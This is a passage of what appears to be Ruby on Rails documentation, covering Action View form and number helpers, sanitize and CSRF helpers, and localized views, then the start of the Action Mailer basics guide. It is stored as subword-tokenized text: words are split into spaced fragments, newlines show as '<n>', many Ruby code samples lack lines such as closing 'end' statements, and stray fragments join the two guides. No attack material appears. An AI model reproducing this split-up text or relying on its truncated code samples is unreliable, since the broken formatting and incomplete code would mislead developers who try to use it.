▁Note : ▁On ly ▁the ▁` option ` ▁tags ▁are ▁returned , ▁you ▁have ▁to ▁wrap ▁this ▁call ▁in ▁a ▁regular ▁HTML ▁` select ` ▁tag .
▁#### ▁options _ from _ collection _ for _ select
▁Return s ▁a ▁string ▁of ▁option ▁tags ▁that ▁have ▁been ▁ compiled ▁by ▁iterat ing ▁over ▁the ▁` collection ` ▁and ▁assign ing ▁the ▁result ▁of ▁a ▁call ▁to ▁the ▁` value _ method ` ▁as ▁the ▁option ▁value ▁and ▁the ▁` text _ method ` ▁as ▁the ▁option ▁text .
▁# ▁options _ from _ collection _ for _ select ( collection , ▁value _ method , ▁text _ method , ▁select ed ▁= ▁nil )
▁For ▁example , ▁i ma g ine ▁a ▁loop ▁iterat ing ▁over ▁each ▁person ▁in ▁@ project . people ▁to ▁generate ▁an ▁input ▁tag :
▁options _ from _ collection _ for _ select (@ project . people , ▁" id ", ▁" name ")
▁# ▁=> ▁< option ▁value ="# { person . id } "> # { person . name }< / option >
▁Create ▁a ▁select ▁tag ▁and ▁a ▁series ▁of ▁contain ed ▁option ▁tags ▁for ▁the ▁provided ▁object ▁and ▁method .
▁< option ▁value =" " ></ option >
▁< option ▁value = "1" ▁select ed =" select ed "> David </ option >
▁< option ▁value =" 2 "> S am </ option >
▁< option ▁value =" 3 "> To b i as </ option >
▁#### ▁time _ zone _ options _ for _ select
▁Return s ▁a ▁string ▁of ▁option ▁tags ▁for ▁ pretty ▁much ▁any ▁time ▁zone ▁in ▁the ▁world .
▁#### ▁time _ zone _ select
▁Return s ▁select ▁and ▁option ▁tags ▁for ▁the ▁given ▁object ▁and ▁method , ▁using ▁` time _ zone _ options _ for _ select ` ▁to ▁generate ▁the ▁list ▁of ▁option ▁tags .
▁time _ zone _ select ( ▁" user ", ▁" time _ zone ")
▁#### ▁date _ field
▁Return s ▁an ▁input ▁tag ▁of ▁the ▁" date " ▁type ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁date _ field (" user ", ▁" d ob ")
▁### ▁For m T a g Helper
▁Provide s ▁a ▁number ▁of ▁methods ▁for ▁creating ▁form ▁tags ▁that ▁don ' t ▁rely ▁on ▁an ▁Active ▁Record ▁object ▁assign ed ▁to ▁the ▁template ▁like ▁For m Helper ▁does .
▁Instead , ▁you ▁provide ▁the ▁names ▁and ▁values ▁manually .
▁#### ▁check _ box _ tag
▁Create s ▁a ▁check ▁box ▁form ▁input ▁tag .
▁check _ box _ tag ▁' accept '
▁# ▁=> ▁< input ▁id =" accept " ▁name =" accept " ▁type =" checkbox " ▁value = "1" ▁/>
▁#### ▁field _ set _ tag
▁Create s ▁a ▁field ▁set ▁for ▁group ing ▁HTML ▁form ▁elements .
▁<%= ▁field _ set _ tag ▁do ▁%>
▁< p > <%= ▁text _ field _ tag ▁' name ' ▁%></ p >
▁# ▁=> ▁< field set >< p >< input ▁id =" name " ▁name =" name " ▁type =" text " ▁/ ></ p ></ field set >
▁#### ▁file _ field _ tag
▁Create s ▁a ▁file ▁upload ▁field .
▁<%= ▁form _ tag ( { action : " post " }, ▁multipart : ▁true ) ▁do ▁%>
▁< label ▁for =" file "> File ▁to ▁U p load </ label > ▁<%= ▁file _ field _ tag ▁" file " ▁%>
▁<%= ▁submit _ tag ▁%>
▁Example ▁output :
▁file _ field _ tag ▁' attachment '
▁# ▁=> ▁< input ▁id =" attachment " ▁name =" attachment " ▁type =" file " ▁/>
▁#### ▁form _ tag
▁Start s ▁a ▁form ▁tag ▁that ▁point s ▁the ▁action ▁to ▁an ▁url ▁configured ▁with ▁` url _ for _ options ` ▁just ▁like ▁` ActionController :: Base # url _ for `.
▁< div > <%= ▁submit _ tag ▁' S a ve ' ▁%></ div >
▁#### ▁hidden _ field _ tag
▁Create s ▁a ▁hidden ▁form ▁input ▁field ▁used ▁to ▁tr an s m it ▁data ▁that ▁would ▁be ▁lost ▁due ▁to ▁HTTP ' s ▁state less n es s ▁or ▁data ▁that ▁should ▁be ▁hidden ▁from ▁the ▁user .
▁hidden _ field _ tag ▁' token ' , ▁' V U B J K B 23 U I V I 1 U U 1 V O B V I @ '
▁# ▁=> ▁< input ▁id =" token " ▁name =" token " ▁type =" hidden " ▁value =" V U B J K B 23 U I V I 1 U U 1 V O B V I @ " ▁/>
▁#### ▁image _ submit _ tag
▁D is play s ▁an ▁image ▁which ▁when ▁click ed ▁will ▁submit ▁the ▁form .
▁image _ submit _ tag (" login . png ")
▁# ▁=> ▁< input ▁src =" / images / login . png " ▁type =" image " ▁/>
▁#### ▁ label _ tag
▁Create s ▁a ▁ label ▁field .
▁ label _ tag ▁' name '
▁# ▁=> ▁< label ▁for =" name "> Name </ label >
▁#### ▁password _ field _ tag
▁Create s ▁a ▁password ▁field , ▁a ▁m as k ed ▁text ▁field ▁that ▁will ▁h id e ▁the ▁users ▁input ▁be h in d ▁a ▁m as k ▁character .
▁password _ field _ tag ▁' pass '
▁# ▁=> ▁< input ▁id =" pass " ▁name =" pass " ▁type =" password " ▁/>
▁#### ▁ ra d io _ button _ tag
▁Create s ▁a ▁ ra d io ▁button ; ▁use ▁group s ▁of ▁ ra d io ▁button s ▁named ▁the ▁same ▁to ▁allow ▁users ▁to ▁select ▁from ▁a ▁group ▁of ▁options .
▁ ra d io _ button _ tag ▁' g end er ' , ▁' ma le '
▁# ▁=> ▁< input ▁id =" g end er _ ma le " ▁name =" g end er " ▁type =" ra d io " ▁value =" ma le " ▁/>
▁#### ▁select _ tag
▁Create s ▁a ▁ drop d own ▁select ion ▁box .
▁select _ tag ▁" people ", ▁" < option > David </ option > "
▁# ▁=> ▁< select ▁id =" people " ▁name =" people " >< option > David </ option ></ select >
▁#### ▁submit _ tag
▁Create s ▁a ▁submit ▁button ▁with ▁the ▁text ▁provided ▁as ▁the ▁ caption .
▁#### ▁text _ area _ tag
▁Create s ▁a ▁text ▁input ▁are a ; ▁use ▁a ▁text area ▁for ▁longer ▁text ▁input s ▁such ▁as ▁blog ▁posts ▁or ▁description s .
▁#### ▁text _ field _ tag
▁Create s ▁a ▁standard ▁text ▁field ; ▁use ▁these ▁text ▁fields ▁to ▁input ▁small er ▁chunks ▁of ▁text ▁like ▁a ▁username ▁or ▁a ▁search ▁query .
▁text _ field _ tag ▁' name '
▁# ▁=> ▁< input ▁id =" name " ▁name =" name " ▁type =" text " ▁/>
▁#### ▁email _ field _ tag
▁Create s ▁a ▁standard ▁input ▁field ▁of ▁email ▁type .
▁email _ field _ tag ▁' email '
▁# ▁=> ▁< input ▁id =" email " ▁name =" email " ▁type =" email " ▁/>
▁#### ▁url _ field _ tag
▁Create s ▁a ▁standard ▁input ▁field ▁of ▁url ▁type .
▁url _ field _ tag ▁' url '
▁# ▁=> ▁< input ▁id =" url " ▁name =" url " ▁type =" url " ▁/>
▁#### ▁date _ field _ tag
▁Create s ▁a ▁standard ▁input ▁field ▁of ▁date ▁type .
▁date _ field _ tag ▁" d ob "
▁# ▁=> ▁< input ▁id =" d ob " ▁name =" d ob " ▁type =" date " ▁/>
▁### ▁JavaScript Helper
▁Provide s ▁functionality ▁for ▁working ▁with ▁JavaScript ▁in ▁your ▁views .
▁#### ▁escape _ javascript
▁E sc ap e ▁c ar r i er ▁returns ▁and ▁single ▁and ▁double ▁ quot es ▁for ▁JavaScript ▁segment s .
▁#### ▁javascript _ tag
▁Return s ▁a ▁JavaScript ▁tag ▁wrapp ing ▁the ▁provided ▁code .
▁javascript _ tag ▁" alert (' A ll ▁is ▁good ') "
▁< script >
▁ alert (' A ll ▁is ▁good ')
▁/ / ]] >
▁</ script >
▁### ▁N um b er Helper
▁Provide s ▁methods ▁for ▁convert ing ▁number s ▁into ▁ formatted ▁strings .
▁ Method s ▁are ▁provided ▁for ▁ phone ▁number s , ▁ currency , ▁ percentage , ▁ precision , ▁position al ▁notation , ▁and ▁file ▁size .
▁#### ▁number _ to _ currency
▁Format s ▁a ▁number ▁into ▁a ▁ currency ▁string ▁( e . g . , ▁ $ 1 3 . 6 5 ).
▁number _ to _ currency ( 12345 6 78 9 0 . 50 ) ▁# ▁=> ▁ $ 1, 23 4 , 5 6 7 , 89 0 . 50
▁#### ▁number _ to _ human _ size
▁Format s ▁the ▁by t es ▁in ▁size ▁into ▁a ▁more ▁understand able ▁representation ; ▁useful ▁for ▁report ing ▁file ▁size s ▁to ▁users .
▁number _ to _ human _ size ( 12 34 ) ▁# ▁=> ▁1. 2 ▁ K B
▁number _ to _ human _ size ( 12345 6 7 ) ▁# ▁=> ▁1. 2 ▁M B
▁#### ▁number _ to _ percentage
▁Format s ▁a ▁number ▁as ▁a ▁ percentage ▁string .
▁number _ to _ percentage ( 10 0, ▁ precision : ▁0 ) ▁# ▁=> ▁100 %
▁#### ▁number _ to _ phone
▁Format s ▁a ▁number ▁into ▁a ▁U S ▁ phone ▁number .
▁number _ to _ phone ( 1235551234 ) ▁# ▁=> ▁123 - 555-1234
▁#### ▁number _ with _ delimiter
▁Format s ▁a ▁number ▁with ▁group ed ▁ th ous and s ▁using ▁a ▁ delimiter .
▁number _ with _ delimiter ( 12345 6 78 ) ▁# ▁=> ▁ 12 , 34 5 , 6 78
▁#### ▁number _ with _ precision
▁Format s ▁a ▁number ▁with ▁the ▁specified ▁level ▁of ▁` precision `, ▁which ▁defaults ▁to ▁3 .
▁number _ with _ precision ( 11 1.23 4 5 ) ▁# ▁=> ▁ 11 1.23 5
▁number _ with _ precision ( 11 1.23 4 5 , ▁2 ) ▁# ▁=> ▁ 11 1.23
▁### ▁S an it ize Helper
▁The ▁S an it ize Helper ▁module ▁provides ▁a ▁set ▁of ▁methods ▁for ▁ sc ru b b ing ▁text ▁of ▁un de s ir ed ▁HTML ▁elements .
▁#### ▁ sanitize
▁ sanitize ▁@ article . body
▁If ▁either ▁the ▁: attributes ▁or ▁: tag s ▁options ▁are ▁passed , ▁only ▁the ▁mentioned ▁tags ▁and ▁attributes ▁are ▁allowed ▁and ▁nothing ▁else .
▁ sanitize ▁@ article . body , ▁tags : ▁% w ( table ▁tr ▁ td ), ▁attributes : ▁% w ( id ▁class ▁style )
▁To ▁change ▁defaults ▁for ▁multiple ▁uses , ▁for ▁example ▁adding ▁table ▁tags ▁to ▁the ▁default :
▁class ▁Application ▁< ▁Rails :: Application
▁config . action _ view . sanitize d _ allow ed _ tag s ▁= ▁' table ' , ▁' tr ' , ▁' td '
▁#### ▁ sanitize _ css ( style )
▁S an it ize s ▁a ▁block ▁of ▁CSS ▁code .
▁#### ▁ str ip _ links ( html )
▁S tr ips ▁all ▁link ▁tags ▁from ▁text ▁leav ing ▁just ▁the ▁link ▁text .
▁ str ip _ links (" < a ▁ href =" http :// rubyonrails . org "> Ruby ▁on ▁Rails </ a > ")
▁# ▁=> ▁Ruby ▁on ▁Rails
▁ str ip _ links (" email s ▁to ▁< a ▁ href =" mail to : me @ email . com "> me @ email . com </ a > . ")
▁# ▁=> ▁email s ▁to ▁me @ email . com .
▁ str ip _ links (' B log : ▁< a ▁ href =" http :// my blog . com / "> V is it </ a > . ')
▁# ▁=> ▁B log : ▁Vi s it .
▁#### ▁ str ip _ tag s ( html )
▁S tr ips ▁all ▁HTML ▁tags ▁from ▁the ▁ html , ▁including ▁comments .
▁This ▁uses ▁the ▁ html - s can n er ▁token ize r ▁and ▁so ▁its ▁HTML ▁pars ing ▁ability ▁is ▁ limited ▁by ▁that ▁of ▁ html - s can n er .
▁ str ip _ tag s (" S tr ip ▁< i > the se </ i > ▁tags !" )
▁# ▁=> ▁S tr ip ▁these ▁tags !
▁ str ip _ tag s (" < b > B ol d </ b > ▁no ▁more !
▁< a ▁ href =' more . html ' > S e e ▁more </ a > ")
▁# ▁=> ▁B ol d ▁no ▁more !
▁See ▁more
▁N B : ▁The ▁output ▁may ▁ still ▁contain ▁un escape d ▁' < ' , ▁' > ' , ▁' & ' ▁characters ▁and ▁confuse ▁browsers .
▁### ▁C s r f Helper
▁Return s ▁ meta ▁tags ▁" c s r f - param " ▁and ▁" c s r f - token " ▁with ▁the ▁name ▁of ▁the ▁c ross - site < n > request ▁ forgery ▁protect ion ▁parameter ▁and ▁token , ▁respectively .
▁<%= ▁c s r f _ meta _ tag s ▁%>
▁NOTE : ▁R egular ▁forms ▁generate ▁hidden ▁fields ▁so ▁they ▁do ▁not ▁use ▁these ▁tags .
▁ Local ize d ▁View s
▁Action ▁View ▁has ▁the ▁ability ▁render ▁different ▁templates ▁depending ▁on ▁the ▁current ▁locale .
▁I 18 n . locale ▁= ▁: de
▁If ▁the ▁local ize d ▁template ▁is n ' t ▁present , ▁the ▁un d ec or at ed ▁version ▁will ▁be ▁used .
▁This ▁means ▁you ' re ▁not ▁required ▁to ▁provide ▁local ize d ▁views ▁for ▁all ▁cases , ▁but ▁they ▁will ▁be ▁preferred ▁and ▁used ▁if ▁available .
▁You ▁can ▁use ▁the ▁same ▁technique ▁to ▁local ize ▁the ▁rescue ▁files ▁in ▁your ▁public ▁directory .
▁For ▁example , ▁setting ▁` I 18 n . locale ▁= ▁: de ` ▁and ▁creating ▁` public / 5 00 . de . html ` ▁and ▁` public / 4 04 . de . html ` ▁would ▁allow ▁you ▁to ▁have ▁local ize d ▁rescue ▁pages .
▁S ince ▁Rails ▁does n ' t ▁restrict ▁the ▁symbols ▁that ▁you ▁use ▁to ▁set ▁I 18 n . locale , ▁you ▁can ▁ le verage ▁this ▁system ▁to ▁display ▁different ▁content ▁depending ▁on ▁anything ▁you ▁like .
▁For ▁example , ▁suppose ▁you ▁have ▁some ▁" expert " ▁users ▁that ▁should ▁see ▁different ▁pages ▁from ▁" normal " ▁users .
▁You ▁could ▁add ▁the ▁following ▁to ▁` app / controllers / application . rb ` :
▁before _ action ▁: set _ expert _ locale
▁def ▁set _ expert _ locale
▁I 18 n . locale ▁= ▁: expert ▁if ▁current _ user . expert ?
▁You ▁can ▁read ▁more ▁about ▁the ▁Rails ▁In ter n ation al i z ation ▁( I 18 n ) ▁API ▁[ h er e ]( i 18 n . html ).
▁Active ▁Support
▁- ------
▁Action ▁View
▁date :
▁ Railtie s
▁Action ▁Mailer ▁B as ic s
▁This ▁guide ▁provides ▁you ▁with ▁all ▁you ▁need ▁to ▁get ▁started ▁in ▁sending ▁and < n > r eceiving ▁email s ▁from ▁and ▁to ▁your ▁application , ▁and ▁many ▁internal s ▁of ▁Action < n > Mailer .
▁It ▁also ▁cover s ▁how ▁to ▁test ▁your ▁mailer s .
▁* ▁How ▁to ▁send ▁and ▁receive ▁email ▁within ▁a ▁Rails ▁application .
▁* ▁How ▁to ▁generate ▁and ▁edit ▁an ▁Action ▁Mailer ▁class ▁and ▁mailer ▁view .
▁* ▁How ▁to ▁configure ▁Action ▁Mailer ▁for ▁your ▁environment .
▁* ▁How ▁to ▁test ▁your ▁Action ▁Mailer ▁classes .
▁Action ▁Mailer ▁allows ▁you ▁to ▁send ▁email s ▁from ▁your ▁application ▁using ▁mailer ▁classes < n > and ▁views .
▁Mailer s ▁work ▁very ▁similar ly ▁to ▁controllers .
▁They ▁inherit ▁from < n >` ActionMailer :: Base ` ▁and ▁live ▁in ▁` app / mailer s `, ▁and ▁they ▁have ▁ associated ▁views < n > that ▁appear ▁in ▁` app / views `.
▁S end ing ▁Email s
▁This ▁section ▁will ▁provide ▁a ▁step - by - step ▁guide ▁to ▁creating ▁a ▁mailer ▁and ▁its < n > views .
▁### ▁W al k through ▁to ▁Generat ing ▁a ▁Mailer
▁#### ▁Create ▁the ▁Mailer
▁ $ ▁bin / rails ▁generate ▁mailer ▁User Mailer
▁create ▁app / mailer s / user _ mailer . rb
▁create ▁app / mailer s / application _ mailer . rb
▁invoke ▁ erb
▁create ▁app / views / user _ mailer
▁create ▁app / views / layouts / mailer . text . erb
▁create ▁app / views / layouts / mailer . html . erb
▁invoke ▁test _ unit
▁create ▁test / mailer s / user _ mailer _ test . rb
▁create ▁test / mailer s / preview s / user _ mailer _ preview . rb
▁# ▁app / mailer s / application _ mailer . rb
▁class ▁Application Mailer ▁< ▁ ActionMailer :: Base
▁default ▁from : ▁" from @ example . com "
▁layout ▁' mailer '
▁# ▁app / mailer s / user _ mailer . rb
▁class ▁User Mailer ▁< ▁Application Mailer
▁As ▁you ▁can ▁see , ▁you ▁can ▁generate ▁mailer s ▁just ▁like ▁you ▁use ▁other ▁generator s ▁with < n > Rails .
▁Mailer s ▁are ▁ concept u ally ▁similar ▁to ▁controllers , ▁and ▁so ▁we ▁get ▁a ▁mailer ,< n > a ▁directory ▁for ▁views , ▁and ▁a ▁test .
▁If ▁you ▁did n ' t ▁want ▁to ▁use ▁a ▁generator , ▁you ▁could ▁create ▁your ▁own ▁file ▁inside ▁of < n > app / mailer s , ▁just ▁make ▁sure ▁that ▁it ▁inherit s ▁from ▁` ActionMailer :: Base ` :
▁class ▁My Mailer ▁< ▁ ActionMailer :: Base
▁#### ▁ Edit ▁the ▁Mailer
▁Mailer s ▁are ▁very ▁similar ▁to ▁Rails ▁controllers .
▁They ▁also ▁have ▁methods ▁called < n > " action s " ▁and ▁use ▁views ▁to ▁structure ▁the ▁content .
▁W h er e ▁a ▁controller ▁generates < n > content ▁like ▁HTML ▁to ▁send ▁back ▁to ▁the ▁client , ▁a ▁Mailer ▁creates ▁a ▁message ▁to ▁be < n > deliver ed ▁via ▁email .
▁` app / mailer s / user _ mailer . rb ` ▁contains ▁an ▁empty ▁mailer :
▁Let ' s ▁add ▁a ▁method ▁called ▁` welcome _ email `, ▁that ▁will ▁send ▁an ▁email ▁to ▁the ▁user ' s < n > register ed ▁email ▁address :
▁default ▁from : ▁' notifications @ example . com '
▁def ▁ welcome _ email ( user )
▁@ user ▁= ▁user
▁@ url ▁= ▁' http :// example . com / login '
▁mail ( to : ▁@ user . email , ▁subject : ▁' Welcome ▁to ▁My ▁A we some ▁ Site ')
▁Here ▁is ▁a ▁quick ▁ ex p la n ation ▁of ▁the ▁items ▁present ed ▁in ▁the ▁pre c ed ing ▁method .
▁For < n > a ▁full ▁list ▁of ▁all ▁available ▁options , ▁please ▁have ▁a ▁look ▁further ▁down ▁at ▁the < n > C omplete ▁L ist ▁of ▁Action ▁Mailer ▁user - set table ▁attributes ▁section .
▁* ▁` default ▁ Hash ` ▁- ▁This ▁is ▁a ▁hash ▁of ▁default ▁values ▁for ▁any ▁email ▁you ▁send ▁from < n > this ▁mailer .
▁In ▁this ▁case ▁we ▁are ▁setting ▁the ▁`: from ` ▁header ▁to ▁a ▁value ▁for ▁all < n > messages ▁in ▁this ▁class .
▁This ▁can ▁be ▁overrid de n ▁on ▁a ▁per - email ▁basis .
▁* ▁` mail ` ▁- ▁The ▁actual ▁email ▁message , ▁we ▁are ▁passing ▁the ▁`: to ` ▁and ▁`: subject `< n > header s ▁in .
▁Ju st ▁like ▁controllers , ▁any ▁instance ▁variables ▁we ▁define ▁in ▁the ▁method ▁become < n > available ▁for ▁use ▁in ▁the ▁views .
▁#### ▁Create ▁a ▁Mailer ▁View
▁Create ▁a ▁file ▁called ▁` welcome _ email . html . erb ` ▁in ▁` app / views / user _ mailer / `.
▁This < n > will ▁be ▁the ▁template ▁used ▁for ▁the ▁email , ▁ formatted ▁in ▁HTML :
▁D O C TYPE ▁ html >
▁< meta ▁content =' text / html ; ▁ cha r set = UT F -8 ' ▁ http - equ i v =' Content - Type ' ▁/>
▁< h 1> Welcome ▁to ▁example . com , ▁<%= ▁@ user . name ▁%></ h 1>
▁< p >
▁You ▁have ▁successfully ▁signed ▁up ▁to ▁example . com ,
▁your ▁username ▁is : ▁<%= ▁@ user . login ▁%> . < br >
▁</ p >
▁To ▁login ▁to ▁the ▁site , ▁just ▁follow ▁this ▁link : ▁<%= ▁@ url ▁%> .
▁< p > T hanks ▁for ▁join ing ▁and ▁have ▁a ▁great ▁day !
▁Let ' s ▁also ▁make ▁a ▁text ▁part ▁for ▁this ▁email .
▁No t ▁all ▁clients ▁prefer ▁HTML ▁email s ,< n > and ▁so ▁sending ▁both ▁is ▁best ▁practice .
▁To ▁do ▁this , ▁create ▁a ▁file ▁called < n >` welcome _ email . text . erb ` ▁in ▁` app / views / user _ mailer / ` :
▁ Welcome ▁to ▁example . com , ▁<%= ▁@ user . name ▁%>
▁= ============== ================ ================
▁You ▁have ▁successfully ▁signed ▁up ▁to ▁example . com ,< n > your ▁username ▁is : ▁<%= ▁@ user . login ▁%> .
▁To ▁login ▁to ▁the ▁site , ▁just ▁follow ▁this ▁link : ▁<%= ▁@ url ▁%> .
▁T hanks ▁for ▁join ing ▁and ▁have ▁a ▁great ▁day !
▁When ▁you ▁call ▁the ▁` mail ` ▁method ▁now , ▁Action ▁Mailer ▁will ▁detect ▁the ▁two ▁templates < n > ( text ▁and ▁HTML ) ▁and ▁automatically ▁generate ▁a ▁` multi part / alternative ` ▁email .
▁#### ▁Call ing ▁the ▁Mailer
▁Mailer s ▁are ▁really ▁just ▁another ▁way ▁to ▁render ▁a ▁view .
▁Instead ▁of ▁rendering ▁a < n > view ▁and ▁sending ▁out ▁the ▁HTTP ▁protocol , ▁they ▁are ▁just ▁sending ▁it ▁out ▁through ▁the < n > email ▁protocol s ▁instead .
▁D ue ▁to ▁this , ▁it ▁make s ▁sense ▁to ▁just ▁have ▁your < n > controller ▁tell ▁the ▁Mailer ▁to ▁send ▁an ▁email ▁when ▁a ▁user ▁is ▁successfully ▁created .
▁Setting ▁this ▁up ▁is ▁p a in full y ▁simple .
▁First , ▁let ' s ▁create ▁a ▁simple ▁` User ` ▁scaffold :
▁ $ ▁bin / rails ▁generate ▁scaffold ▁user ▁name ▁email ▁login
▁ $ ▁bin / rake ▁db : migrate
▁Now ▁that ▁we ▁have ▁a ▁user ▁model ▁to ▁ play ▁with , ▁we ▁will ▁just ▁edit ▁the < n >` app / controllers / users _ controller . rb ` ▁make ▁it ▁instruct ▁the ▁` User Mailer ` ▁to ▁ deliver < n > an ▁email ▁to ▁the ▁new ly ▁created ▁user ▁by ▁editing ▁the ▁create ▁action ▁and ▁insert ing ▁a < n > c all ▁to ▁` User Mailer . welcome _ email ` ▁right ▁after ▁the ▁user ▁is ▁successfully ▁saved .
▁Action ▁Mailer ▁is ▁nicely ▁integrat ed ▁with ▁Active ▁Job ▁so ▁you ▁can ▁send ▁email s ▁outside < n > of ▁the ▁request - response ▁cycle , ▁so ▁the ▁user ▁does n ' t ▁have ▁to ▁wait ▁on ▁it :
▁# ▁POST ▁/ users
▁# ▁POST ▁/ users . json
▁# ▁T e ll ▁the ▁User Mailer ▁to ▁send ▁a ▁ welcome ▁email ▁after ▁save
▁User Mailer . welcome _ email (@ user ). deliver _ later
▁format . html ▁ { ▁redirect _ to (@ user , ▁notice : ▁' User ▁was ▁successfully ▁created . ')
▁format . html ▁ { ▁render ▁action : ▁' new ' ▁ }
▁NOTE : ▁Active ▁Job ' s ▁default ▁behavior ▁is ▁to ▁execute ▁job s ▁' : in line ' .
▁So , ▁you ▁can ▁use < n >` deliver _ later ` ▁now ▁to ▁send ▁email s , ▁and ▁when ▁you ▁later ▁decide ▁to ▁start ▁sending < n > the m ▁from ▁a ▁background ▁job , ▁you ' ll ▁only ▁need ▁to ▁set ▁up ▁Active ▁Job ▁to ▁use ▁a ▁ queue ing < n > back end ▁( S id e k i q , ▁Re s q ue , ▁etc ).
▁If ▁you ▁want ▁to ▁send ▁email s ▁right ▁a way ▁( from ▁a ▁c r on job ▁for ▁example ) ▁just ▁call < n >` deliver _ now ` :
▁class ▁S end We e k ly S um m ary
▁def ▁run
▁User . find _ each ▁do ▁| user |
▁User Mailer . week ly _ sum m ary ( user ). deliver _ now
▁The ▁method ▁` welcome _ email ` ▁returns ▁a ▁` ActionMailer :: Message Delivery ` ▁object ▁which < n > can ▁the n ▁just ▁be ▁to l d ▁` deliver _ now ` ▁or ▁` deliver _ later ` ▁to ▁send ▁itself ▁out .
▁The < n >` ActionMailer :: Message Delivery ` ▁object ▁is ▁just ▁a ▁wrapp er ▁around ▁a ▁` Mail :: Message `.
▁If < n > you ▁want ▁to ▁ inspect , ▁alter ▁or ▁do ▁anything ▁else ▁with ▁the ▁` Mail :: Message ` ▁object ▁you ▁can < n > access ▁it ▁with ▁the ▁` message ` ▁method ▁on ▁the ▁` ActionMailer :: Message Delivery ` ▁object .
▁### ▁A u to ▁encoding ▁header ▁values
▁Action ▁Mailer ▁handle s ▁the ▁ auto ▁encoding ▁of ▁ multi by t e ▁characters ▁inside ▁of < n > header s ▁and ▁b o d ies .
▁For ▁more ▁complex ▁examples ▁such ▁as ▁defin ing ▁alternate ▁character ▁set s ▁or < n > self - en coding ▁text ▁first , ▁please ▁refer ▁to ▁the < n >[ Mail ]( https :// github . com / m ike l / mail ) ▁library .
▁### ▁C omplete ▁L ist ▁of ▁Action ▁Mailer ▁ Method s
▁There ▁are ▁just ▁three ▁methods ▁that ▁you ▁need ▁to ▁send ▁ pretty ▁much ▁any ▁email < n > message :
▁* ▁` header s ` ▁- ▁Specif ies ▁any ▁header ▁on ▁the ▁email ▁you ▁want .
▁You ▁can ▁pass ▁a ▁hash ▁of < n > ▁header ▁field ▁names ▁and ▁value ▁pair s , ▁or ▁you ▁can ▁call ▁` header s [: field _ name ] ▁= < n > ▁' value ' `.
▁* ▁` attachment s ` ▁- ▁A l low s ▁you ▁to ▁add ▁ attachment s ▁to ▁your ▁email .
▁For ▁example ,< n > ▁` attachment s [' file - name . jpg '] ▁= ▁File . read (' file - name . jpg ') `.
▁* ▁` mail ` ▁- ▁S end s ▁the ▁actual ▁email ▁itself .
▁You ▁can ▁pass ▁in ▁headers ▁as ▁a ▁hash ▁to < n > ▁the ▁mail ▁method ▁as ▁a ▁parameter , ▁mail ▁will ▁the n ▁create ▁an ▁email , ▁either ▁plain < n > ▁text , ▁or ▁multipart , ▁depending ▁on ▁what ▁email ▁templates ▁you ▁have ▁defined .
▁#### ▁ Adding ▁A tt a ch ment s
▁Action ▁Mailer ▁make s ▁it ▁very ▁easy ▁to ▁add ▁ attachment s .
▁* ▁Pass ▁the ▁file ▁name ▁and ▁content ▁and ▁Action ▁Mailer ▁and ▁the < n > ▁[ Mail ▁gem ]( https :// github . com / m ike l / mail ) ▁will ▁automatically ▁guess ▁the < n > ▁ mime _ type , ▁set ▁the ▁encoding ▁and ▁create ▁the ▁ attachment .
▁ attachment s [' filename . jpg '] ▁= ▁File . read (' / path / to / filename . jpg ')
▁When ▁the ▁` mail ` ▁method ▁will ▁be ▁trigger ed , ▁it ▁will ▁send ▁a ▁multipart ▁email ▁with < n > ▁an ▁ attachment , ▁properly ▁nested ▁with ▁the ▁to p ▁level ▁being ▁` multi part / m i x ed ` ▁and < n > ▁the ▁first ▁part ▁being ▁a ▁` multi part / alternative ` ▁containing ▁the ▁plain ▁text ▁and < n > ▁HTML ▁email ▁messages .
▁NOTE : ▁ Mail ▁will ▁automatically ▁ Base 64 ▁ en code ▁an ▁ attachment .
▁If ▁you ▁want ▁something < n > different , ▁ en code ▁your ▁content ▁and ▁pass ▁in ▁the ▁ en code d ▁content ▁and ▁encoding ▁in ▁a < n >` Hash ` ▁to ▁the ▁` attachment s ` ▁method .
▁* ▁Pass ▁the ▁file ▁name ▁and ▁specify ▁headers ▁and ▁content ▁and ▁Action ▁Mailer ▁and ▁ Mail < n > ▁will ▁use ▁the ▁settings ▁you ▁pass ▁in .
▁ en code d _ content ▁= ▁S p e cial E n code ( File . read (' / path / to / filename . jpg ') )
▁ attachment s [' filename . jpg '] ▁= ▁ {
▁ mime _ type : ▁' application / x - g z ip ' ,
▁encoding : ▁' S p e cial Encoding ' ,
▁content : ▁ en code d _ content
▁NOTE : ▁If ▁you ▁specify ▁an ▁encoding , ▁ Mail ▁will ▁assume ▁that ▁your ▁content ▁is ▁already < n > en code d ▁and ▁not ▁try ▁to ▁ Base 64 ▁ en code ▁it .
▁#### ▁Mak ing ▁In line ▁A tt a ch ment s
▁Action ▁Mailer ▁3.0 ▁make s ▁in line ▁ attachment s , ▁which ▁involve d ▁a ▁lot ▁of ▁ha c k ing ▁in ▁pre ▁3.0 ▁versions , ▁much ▁simple r ▁and ▁tr i via l ▁as ▁they ▁should ▁be .
▁* ▁First , ▁to ▁tell ▁ Mail ▁to ▁turn ▁an ▁ attachment ▁into ▁an ▁in line ▁ attachment , ▁you ▁just ▁call ▁` # in line ` ▁on ▁the ▁ attachment s ▁method ▁within ▁your ▁Mailer :
▁def ▁ welcome
▁ attachment s . in line [' image . jpg '] ▁= ▁File . read (' / path / to / image . jpg ')
▁* ▁Then ▁in ▁your ▁view , ▁you ▁can ▁just ▁reference ▁` attachment s ` ▁as ▁a ▁hash ▁and ▁specify < n > ▁which ▁ attachment ▁you ▁want ▁to ▁show , ▁calling ▁` url ` ▁on ▁it ▁and ▁the n ▁passing ▁the < n > ▁result ▁into ▁the ▁` image _ tag ` ▁method :
▁`` ` html + erb
▁< p > Hello ▁there , ▁this ▁is ▁our ▁image </ p >
▁<%= ▁image _ tag ▁ attachment s [' image . jpg '] . url ▁%>
▁* ▁As ▁this ▁is ▁a ▁standard ▁call ▁to ▁` image _ tag ` ▁you ▁can ▁pass ▁in ▁an ▁options ▁hash < n > ▁after ▁the ▁ attachment ▁URL ▁as ▁you ▁could ▁for ▁any ▁other ▁image :
▁<%= ▁image _ tag ▁ attachment s [' image . jpg '] . url , ▁ alt : ▁' M y ▁P h o to ' , ▁class : ▁' photos ' ▁%>
▁#### ▁S end ing ▁Email ▁To ▁Multi p le ▁Re c ip i ent s
▁It ▁is ▁possible ▁to ▁send ▁email ▁to ▁one ▁or ▁more ▁re c ip i ent s ▁in ▁one ▁email ▁( e . g . ,< n > in form ing ▁all ▁admin s ▁of ▁a ▁new ▁signup ) ▁by ▁setting ▁the ▁list ▁of ▁email s ▁to ▁the ▁`: to `< n > key .
